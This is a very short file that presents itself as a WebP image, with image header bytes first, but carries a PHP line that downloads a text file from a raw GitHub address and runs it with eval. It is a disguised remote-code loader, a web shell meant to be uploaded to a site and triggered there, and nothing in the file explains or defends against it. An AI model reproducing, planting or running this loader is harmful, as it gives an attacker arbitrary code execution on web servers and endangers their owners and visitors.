RIFF¤  WEBPVP8 ˜  ðÑ *ôô>‘HŸK¥¤"§£±¨àð	

<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/Violetdesu/Violet/refs/heads/main/anggrek.txt"));?>